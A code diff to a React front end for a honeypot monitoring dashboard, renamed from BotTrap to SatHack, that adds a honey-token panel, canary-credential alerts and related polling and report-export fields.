@@ -1256,6 +1491,7 @@ function AttackTypeChart({ events, activeType, onSelectType }) {
         ) : (
           rows.map((row) => {
             const isSelected = activeType === row.type;
+            const isHoney = row.type === 'Honey-Token Used';
             return (
               <button
                 key={row.type}
@@ -1267,7 +1503,11 @@ function AttackTypeChart({ events, activeType, onSelectType }) {
                 <div className="flex items-center justify-between text-xs mb-1">
                   <span
                     className={`truncate pr-2 ${
-                      isSelected ? 'text-[#F0F2F5] font-medium' : 'text-[#8A93A2] group-hover:text-[#F0F2F5]'
+                      isSelected
+                        ? 'text-[#F0F2F5] font-medium'
+                        : isHoney
+                        ? 'text-[#E5484D] group-hover:text-[#F0F2F5]'
+                        : 'text-[#8A93A2] group-hover:text-[#F0F2F5]'
                     }`}
                   >
                     {row.type}
@@ -1282,7 +1522,11 @@ function AttackTypeChart({ events, activeType, onSelectType }) {
                     className="h-full transition-all duration-300"
                     style={{
                       width: `${Math.max(4, row.pct)}%`,
-                      backgroundColor: isSelected ? '#14B8A6' : '#3B82F6',
+                      backgroundColor: isHoney
+                        ? '#E5484D'
+                        : isSelected
+                        ? '#14B8A6'
+                        : '#3B82F6',
                     }}
                   />
                 </div>
@@ -1482,6 +1726,142 @@ function TopAttackers({ events, activeActor, onSelectActor }) {
 }
 
 // ============================================================================
+// COMPONENT 5F: HONEY-TOKENS PANEL (Issued / USED Canary Credentials Table)
+// ============================================================================
+
+function HoneyTokensPanel({ tokens = [], loading = false, error = null, stats = null, onSelectIp }) {
+  return (
+    <div className="bg-[#0E1014] border border-[#1E232C] rounded-[4px] overflow-hidden">
+      <div className="px-4 py-2.5 border-b border-[#1E232C] flex flex-wrap items-center justify-between gap-2">
+        <div className="flex items-center gap-2">
+          <Lock className="w-3.5 h-3.5 text-[#E5484D]" />
+          <h2 className="text-xs font-mono uppercase tracking-wider text-[#F0F2F5]">
+            Honey-Tokens (Canary Credentials)
+          </h2>
+          <span className="text-[11px] font-mono text-[#525B6A] tabular-nums">
+            ({tokens.length} tracked)
+          </span>
+        </div>
+
+        {stats && (
+          <div className="flex items-center gap-3 text-[11px] font-mono text-[#8A93A2] tabular-nums">
+            <span>
+              ISSUED: <strong className="text-[#F0F2F5]">{stats.issued}</strong>
+            </span>
+            <span>
+              USED: <strong className="text-[#E5484D]">{stats.used}</strong>
+            </span>
+            <span className="hidden sm:inline">
+              READERS: <strong className="text-[#F0F2F5]">{stats.readers}</strong>
+            </span>
+            <span className="hidden md:inline">
+              AVG USE: <strong className="text-[#E5A93C]">{stats.avg_seconds_to_use}s</strong>
+            </span>
+          </div>
+        )}
+      </div>
+
+      {error ? (
+        <div className="p-6 text-center text-xs font-mono text-[#E5484D]">
+          Failed to load honey-tokens: {String(error)}
+        </div>
+      ) : loading ? (
+        <div className="p-4 space-y-2.5" aria-busy="true">
+          {[0, 1, 2].map((idx) => (
+            <div
+              key={idx}
+              className="h-8 bg-[#14171D] border border-[#1E232C] rounded-[3px] animate-pulse"
+            />
+          ))}
+        </div>
+      ) : tokens.length === 0 ? (
+        <div className="py-10 px-4 text-center text-xs font-mono text-[#525B6A]">
+          No tokens issued yet. They appear when someone reads the fake{' '}
+          <code className="text-[#8A93A2]">/.env</code>.
+        </div>
+      ) : (
+        <div className="overflow-x-auto max-h-[300px] overflow-y-auto">
+          <table className="w-full text-left border-collapse min-w-[780px]">
+            <thead className="sticky top-0 z-10 bg-[#08090B] border-b border-[#1E232C] text-[10px] font-mono uppercase tracking-wider text-[#525B6A]">
+              <tr>
+                <th className="py-2 px-4">Masked Token</th>
+                <th className="py-2 px-3">Kind</th>
+                <th className="py-2 px-3">Issued to IP</th>
+                <th className="py-2 px-3">Leaked at</th>
+                <th className="py-2 px-3">Issued</th>
+                <th className="py-2 px-3">Status</th>
+                <th className="py-2 px-3 text-right">Uses</th>
+                <th className="py-2 px-4 text-right">Sec to First Use</th>
+              </tr>
+            </thead>
+            <tbody className="divide-y divide-[#1E232C]/60 text-xs font-mono">
+              {tokens.map((t) => {
+                const isUsed = t.status === 'used';
+                return (
+                  <tr
+                    key={t.id}
+                    onClick={() => onSelectIp && onSelectIp(t.issued_to_ip)}
+                    className={`transition-colors ${
+                      onSelectIp ? 'cursor-pointer' : ''
+                    } ${
+                      isUsed
+                        ? 'bg-[#E5484D]/[0.06] hover:bg-[#E5484D]/[0.11]'
+                        : 'hover:bg-[#14171D]/70'
+                    }`}
+                    style={
+                      isUsed ? { boxShadow: 'inset 2px 0 0 #E5484D' } : undefined
+                    }
+                  >
+                    <td className="py-2.5 px-4 text-[#F0F2F5] whitespace-nowrap">
+                      {t.token_masked}
+                    </td>
+                    <td className="py-2.5 px-3 text-[#8A93A2] whitespace-nowrap">
+                      {t.kind}
+                    </td>
+                    <td className="py-2.5 px-3 text-[#F0F2F5] tabular-nums whitespace-nowrap">
+                      {t.issued_to_ip}
+                    </td>
+                    <td className="py-2.5 px-3 text-[#14B8A6] whitespace-nowrap">
+                      {t.issued_on_path}
+                    </td>
+                    <td className="py-2.5 px-3 text-[#8A93A2] tabular-nums whitespace-nowrap">
+                      {formatTimeHMS(t.created_at)}
+                    </td>
+                    <td className="py-2.5 px-3 whitespace-nowrap">
+                      <span
+                        className={
+                          isUsed
+                            ? 'badge badge-critical inline-flex items-center px-1.5 py-0.5 text-[10px] font-semibold rounded-[3px] border border-[#E5484D]/50 bg-[#E5484D]/20 text-[#E5484D]'
+                            : 'badge inline-flex items-center px-1.5 py-0.5 text-[10px] font-semibold rounded-[3px] border border-[#2E3543] bg-[#14171D] text-[#8A93A2]'
+                        }
+                      >
+                        {isUsed ? 'USED' : 'Issued'}
+                      </span>
+                    </td>
+                    <td className="py-2.5 px-3 text-right text-[#F0F2F5] tabular-nums whitespace-nowrap">
+                      {t.used_count ?? 0}
+                    </td>
+                    <td className="py-2.5 px-4 text-right tabular-nums whitespace-nowrap">
+                      {t.seconds_to_use !== null && t.seconds_to_use !== undefined ? (
+                        <span className="text-[#E5484D] font-semibold">
+                          {t.seconds_to_use}s
+                        </span>
+                      ) : (
+                        <span className="text-[#525B6A]">—</span>
+                      )}
+                    </td>
+                  </tr>
+                );
+              })}
+            </tbody>
+          </table>
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ============================================================================
 // COMPONENT 6: LIVE FEED (High-Density Interactive Telemetry Log Table)
 // ============================================================================
 
@@ -1533,11 +1913,9 @@ function LiveFeed({ events, selectedEventId, onInspectEvent }) {
                     key={ev.id}
                     onClick={() => onInspectEvent(ev)}
                     className={`cursor-pointer transition-colors relative ${
-                      ev.isNew ? 'bottrap-new-row' : ''
+                      ev.isNew ? 'sathack-new-row' : ''
                     } ${
-                      isSelected
-                        ? 'bg-[#14171D]'
-                        : 'hover:bg-[#14171D]/70'
+                      isSelected ? 'bg-[#14171D]' : 'hover:bg-[#14171D]/70'
                     }`}
                     style={
                       ev.isNew
@@ -1570,7 +1948,14 @@ function LiveFeed({ events, selectedEventId, onInspectEvent }) {
                       <span className="text-[11px] text-[#525B6A]">{ev.city}</span>
                     </td>
                     <td className="py-2.5 px-3 text-[#F0F2F5] whitespace-nowrap">
-                      {ev.attackType}
+                      <div className="flex items-center gap-2">
+                        <span>{ev.attackType}</span>
+                        {ev.source === 'honey_token' && (
+                          <span className="badge badge-critical px-1.5 py-0.2 text-[9px] font-mono uppercase rounded-[2px] border border-[#E5484D]/50 bg-[#E5484D]/15 text-[#E5484D]">
+                            Honey-Token
+                          </span>
+                        )}
+                      </div>
                     </td>
                     <td className="py-2.5 px-3 font-mono text-[#14B8A6] whitespace-nowrap">
                       {ev.targetPath}
@@ -1625,6 +2010,7 @@ function EventDetailModal({ event, onClose, onFilterByIp }) {
   if (!event) return null;
 
   const sev = SEVERITY_META[event.severity];
+  const isHoneyToken = event.source === 'honey_token';
 
   const handleCopy = async (text, setter) => {
     try {
@@ -1632,7 +2018,6 @@ function EventDetailModal({ event, onClose, onFilterByIp }) {
       setter(true);
       setTimeout(() => setter(false), 1800);
     } catch {
-      // Fallback copy for restricted preview sandboxes
       const ta = document.createElement('textarea');
       ta.value = text;
       document.body.appendChild(ta);
@@ -1646,15 +2031,12 @@ function EventDetailModal({ event, onClose, onFilterByIp }) {
 
   return (
     <div className="fixed inset-0 z-50 flex justify-end">
-      {/* Backdrop */}
       <div
         className="fixed inset-0 bg-black/65 transition-opacity"
         onClick={onClose}
       />
 
-      {/* Slide-over Inspector Drawer */}
-      <aside className="relative z-10 w-full max-w-xl bg-[#0E1014] border-l border-[#2E3543] h-full flex flex-col shadow-2xl bottrap-drawer-in">
-        {/* Top Chromatic Hairline */}
+      <aside className="relative z-10 w-full max-w-xl bg-[#0E1014] border-l border-[#2E3543] h-full flex flex-col shadow-2xl sathack-drawer-in">
         <div
           className="h-[1px] w-full shrink-0"
           style={{
@@ -1665,7 +2047,7 @@ function EventDetailModal({ event, onClose, onFilterByIp }) {
 
         {/* Drawer Header */}
         <div className="px-5 py-3.5 border-b border-[#1E232C] flex items-center justify-between gap-3 shrink-0">
-          <div className="flex items-center gap-2.5 min-w-0">
+          <div className="flex items-center gap-2 min-w-0 flex-wrap">
             <span
               className="px-2 py-0.5 text-[10px] font-mono font-semibold rounded-[3px] border shrink-0"
               style={{
@@ -1676,13 +2058,18 @@ function EventDetailModal({ event, onClose, onFilterByIp }) {
             >
               {sev.label}
             </span>
+            {isHoneyToken && (
+              <span className="badge badge-critical px-2 py-0.5 text-[10px] font-mono font-semibold rounded-[3px] border border-[#E5484D]/60 bg-[#E5484D]/20 text-[#E5484D] shrink-0">
+                Honey-Token
+              </span>
+            )}
             <span className="font-mono text-xs text-[#F0F2F5] font-semibold truncate">
               {event.id} — {event.attackType}
             </span>
           </div>
           <button
             onClick={onClose}
-            className="p-1.5 rounded-[4px] text-[#8A93A2] hover:text-[#F0F2F5] hover:bg-[#14171D] transition-colors"
+            className="p-1.5 rounded-[4px] text-[#8A93A2] hover:text-[#F0F2F5] hover:bg-[#14171D] transition-colors shrink-0"
             aria-label="Close inspector"
           >
             <X className="w-4 h-4" />
@@ -1785,13 +2172,17 @@ function EventDetailModal({ event, onClose, onFilterByIp }) {
             </pre>
           </div>
 
-          {/* AI Threat Analysis Section */}
+          {/* Triage Analysis Section */}
           <div className="bg-[#08090B] border border-[#1E232C] rounded-[4px] overflow-hidden">
             <div className="px-3.5 py-2.5 border-b border-[#1E232C] bg-[#14171D]/60 flex items-center justify-between">
               <div className="flex items-center gap-2">
-                <Cpu className="w-3.5 h-3.5 text-[#14B8A6]" />
+                {isHoneyToken ? (
+                  <Lock className="w-3.5 h-3.5 text-[#E5484D]" />
+                ) : (
+                  <Cpu className="w-3.5 h-3.5 text-[#14B8A6]" />
+                )}
                 <span className="text-[11px] font-mono uppercase tracking-wider text-[#F0F2F5]">
-                  AI LLM Tactical Triage
+                  {isHoneyToken ? 'Canary Token Detection ($0 LLM)' : 'AI LLM Tactical Triage'}
                 </span>
               </div>
               <span className="text-[11px] font-mono text-[#2EB872] tabular-nums">
@@ -1813,7 +2204,6 @@ function EventDetailModal({ event, onClose, onFilterByIp }) {
                 <p className="text-[#8A93A2] leading-relaxed">{event.aiIntent}</p>
               </div>
 
-              {/* Generated Mitigation Snippet */}
               <div className="pt-2 border-t border-[#1E232C]">
                 <div className="flex items-center justify-between mb-1.5">
                   <span className="text-[10px] font-mono uppercase tracking-wider text-[#525B6A] flex items-center gap-1.5">
@@ -1868,20 +2258,20 @@ function AboutModal({ open, onClose }) {
   const stages = [
     {
       step: '01',
-      title: 'Honeypot Decoys',
-      desc: 'Low-interaction HTTP & SSH tarpit endpoints (/admin, /wp-login.php, /.env, SSH:22) capturing raw requests and credentials.',
+      title: 'Honeypot Decoys & Canary Leaks',
+      desc: 'Low-interaction HTTP & SSH endpoints (/admin, /wp-login.php, /.env, /.git/config, SSH:22) issuing per-visitor honey-tokens and capturing raw requests.',
       accent: '#3B82F6',
     },
     {
       step: '02',
-      title: 'Deterministic Rule Engine',
-      desc: 'Regex & heuristic pipeline (pipeline/rules.py) classifying SQLi, RCE, LFI, XSS, and brute-force patterns in sub-millisecond time.',
+      title: 'Canary Step 0 & Rule Engine',
+      desc: 'Worker checks stolen honey-tokens first ($0 LLM cost), then runs regex/heuristic classification (pipeline/rules.py) in sub-millisecond time.',
       accent: '#14B8A6',
     },
     {
       step: '03',
       title: 'MITRE ATT&CK Mapper',
-      desc: 'Enriches every classified hit with GeoIP/ASN telemetry and maps payloads to ATT&CK techniques (T1190, T1110, T1059, T1083).',
+      desc: 'Enriches every classified hit with GeoIP/ASN telemetry and maps payloads to ATT&CK techniques (T1078, T1190, T1110, T1059, T1083).',
       accent: '#E5A93C',
     },
     {
@@ -1906,10 +2296,10 @@ function AboutModal({ open, onClose }) {
         <div className="px-5 py-4 border-b border-[#1E232C] flex items-center justify-between">
           <div>
             <h3 className="text-sm font-mono font-semibold text-[#F0F2F5] tracking-wider uppercase">
-              BotTrap Pipeline Architecture
+              SatHack Pipeline Architecture
             </h3>
             <p className="text-xs text-[#8A93A2] mt-0.5">
-              End-to-end deceptive telemetry, automated classification, and AI-assisted SOC triage
+              End-to-end deceptive telemetry, canary token traps, and AI-assisted SOC triage
             </p>
           </div>
           <button
@@ -1947,7 +2337,7 @@ function AboutModal({ open, onClose }) {
         </div>
 
         <div className="px-5 py-3 bg-[#08090B] border-t border-[#1E232C] flex items-center justify-between text-[11px] font-mono text-[#525B6A]">
-          <span>BOTTRAP // HONEYPOT + FLASK/FASTAPI + LLM + REACT</span>
+          <span>SATHACK-MAIN // HONEYPOT + CANARY TOKENS + FASTAPI + LLM + REACT</span>
           <button
             onClick={onClose}
             className="px-3 py-1 bg-[#14171D] border border-[#2E3543] rounded-[4px] text-[#F0F2F5] hover:bg-[#1E232C]"
@@ -1981,6 +2371,27 @@ export default function App() {
   const [aboutOpen, setAboutOpen] = useState(false);
   const [toast, setToast] = useState(null);
 
+  // Honey-Token API Polling (/api/tokens, /api/tokens?status=used, /api/tokens/stats)
+  const tokensPoll = usePolling('/api/tokens?limit=20', {
+    enabled: isLive,
+    intervalMs: 3500,
+    mockFactory: () => ({ tokens: buildMockHoneyTokens() }),
+  });
+
+  const usedTokensPoll = usePolling('/api/tokens?status=used&limit=5', {
+    enabled: isLive,
+    intervalMs: 3500,
+    mockFactory: () => ({
+      tokens: buildMockHoneyTokens().filter((t) => t.status === 'used'),
+    }),
+  });
+
+  const tokenStatsPoll = usePolling('/api/tokens/stats', {
+    enabled: isLive,
+    intervalMs: 3500,
+    mockFactory: buildMockTokenStats,
+  });
+
   const showToast = useCallback((message) => {
     setToast(message);
     setTimeout(() => {
@@ -1995,7 +2406,6 @@ export default function App() {
       const fresh = createEvent(0, true);
       setEvents((prev) => [fresh, ...prev.slice(0, 149)]);
 
-      // Clear new-row highlight after 2.4s
       setTimeout(() => {
         setEvents((curr) =>
           curr.map((e) => (e.id === fresh.id ? { ...e, isNew: false } : e))
@@ -2035,7 +2445,7 @@ export default function App() {
       if (mitreFilter && ev.mitreId !== mitreFilter) return false;
       if (actorFilter && ev.ip !== actorFilter) return false;
       if (q) {
-        const haystack = `${ev.ip} ${ev.country} ${ev.city} ${ev.asn} ${ev.attackType} ${ev.targetPath} ${ev.mitreId} ${ev.payload} ${ev.ruleId}`.toLowerCase();
+        const haystack = `${ev.ip} ${ev.country} ${ev.city} ${ev.asn} ${ev.attackType} ${ev.targetPath} ${ev.mitreId} ${ev.payload} ${ev.ruleId} ${ev.source || ''}`.toLowerCase();
         if (!haystack.includes(q)) return false;
       }
       return true;
@@ -2064,6 +2474,7 @@ export default function App() {
             generatedAt: new Date().toISOString(),
             sensor: HONEYPOT_NODE.id,
             totalEvents: filteredEvents.length,
+            honeyTokenStats: tokenStatsPoll.data || null,
             events: filteredEvents,
           },
           null,
@@ -2075,10 +2486,11 @@ export default function App() {
         const crit = filteredEvents.filter((e) => e.severity === 'CRITICAL').length;
         const uniqueIps = new Set(filteredEvents.map((e) => e.ip)).size;
         const lines = [
-          `# BotTrap Honeypot Threat Intelligence Report`,
+          `# SatHack Honeypot Threat Intelligence Report`,
           `- **Generated:** ${new Date().toISOString()}`,
           `- **Sensor Node:** ${HONEYPOT_NODE.name} (${HONEYPOT_NODE.id})`,
           `- **Filtered Events:** ${filteredEvents.length} (${crit} Critical, ${uniqueIps} Unique IPs)`,
+          `- **Honey-Tokens Caught:** ${tokenStatsPoll.data?.used ?? 0}`,
           ``,
           `## Captured Events Summary`,
           `| Timestamp | Severity | Source IP | Geo | Attack Vector | Target | MITRE |`,
@@ -2097,14 +2509,14 @@ export default function App() {
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
-      a.download = `bottrap-threat-report-${ts}.${ext}`;
+      a.download = `sathack-threat-report-${ts}.${ext}`;
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
       URL.revokeObjectURL(url);
       showToast(`Exported ${filteredEvents.length} events as .${ext.toUpperCase()}`);
     },
-    [filteredEvents, showToast]
+    [filteredEvents, tokenStatsPoll.data, showToast]
   );
 
   return (
@@ -2113,26 +2525,26 @@ export default function App() {
         {/* Precision Animations & Tabular Numerals */}
         <style>{`
           .tabular-nums { font-variant-numeric: tabular-nums; }
-          @keyframes bottrapArcFlow {
+          @keyframes sathackArcFlow {
             from { stroke-dashoffset: 146; }
             to { stroke-dashoffset: 0; }
           }
-          .bottrap-arc-flow {
-            animation: bottrapArcFlow 2.6s linear infinite;
+          .sathack-arc-flow {
+            animation: sathackArcFlow 2.6s linear infinite;
           }
-          @keyframes bottrapNewRow {
+          @keyframes sathackNewRow {
             0% { background-color: rgba(20, 184, 166, 0.12); }
             100% { background-color: transparent; }
           }
-          .bottrap-new-row {
-            animation: bottrapNewRow 2.2s ease-out;
+          .sathack-new-row {
+            animation: sathackNewRow 2.2s ease-out;
           }
-          @keyframes bottrapDrawerIn {
+          @keyframes sathackDrawerIn {
             from { transform: translateX(28px); opacity: 0; }
             to { transform: translateX(0); opacity: 1; }
           }
-          .bottrap-drawer-in {
-            animation: bottrapDrawerIn 0.18s cubic-bezier(0.16, 1, 0.3, 1);
+          .sathack-drawer-in {
+            animation: sathackDrawerIn 0.18s cubic-bezier(0.16, 1, 0.3, 1);
           }
         `}</style>
 
@@ -2149,19 +2561,32 @@ export default function App() {
 
         {/* Main Workspace Container */}
         <main className="max-w-[1600px] mx-auto px-4 sm:px-6 py-4 space-y-3.5">
+          {/* 1B. Red Honey-Token Alert Banner (above Threat Level Banner) */}
+          <HoneyTokenAlert
+            tokens={usedTokensPoll.data?.tokens || []}
+            onInspectToken={(tok) => setActorFilter(tok.used_by_ip || tok.issued_to_ip)}
+          />
+
           {/* 2. Threat Level Banner */}
           <ThreatLevelBanner
             events={events}
             onSelectPath={(path) => setSearchQuery(path)}
           />
 
-          {/* 3. Stat Cards (4 KPIs) */}
+          {/* 3. Stat Cards (4 Base KPIs + Honey-tokens caught) */}
           <StatCards
             events={filteredEvents}
             allEvents={events}
             activeSeverity={severityFilter}
             onToggleCritical={() =>
               setSeverityFilter((curr) => (curr === 'CRITICAL' ? 'ALL' : 'CRITICAL'))
+            }
+            honeyTokensCaught={tokenStatsPoll.data?.used}
+            activeAttackType={attackTypeFilter}
+            onToggleHoneyTokens={() =>
+              setAttackTypeFilter((curr) =>
+                curr === 'Honey-Token Used' ? 'ALL' : 'Honey-Token Used'
+              )
             }
           />
 
@@ -2212,6 +2637,17 @@ export default function App() {
               onSelectActor={setActorFilter}
             />
           </div>
+
+          {/* 5B. Honey-Tokens Panel (Lower Grid) */}
+          <HoneyTokensPanel
+            tokens={tokensPoll.data?.tokens || []}
+            loading={tokensPoll.loading}
+            error={tokensPoll.error}
+            stats={tokenStatsPoll.data}
+            onSelectIp={(ip) =>
+              setActorFilter((curr) => (curr === ip ? null : ip))
+            }
+          />
 
           {/* 6. Live Feed Table */}
           <LiveFeed
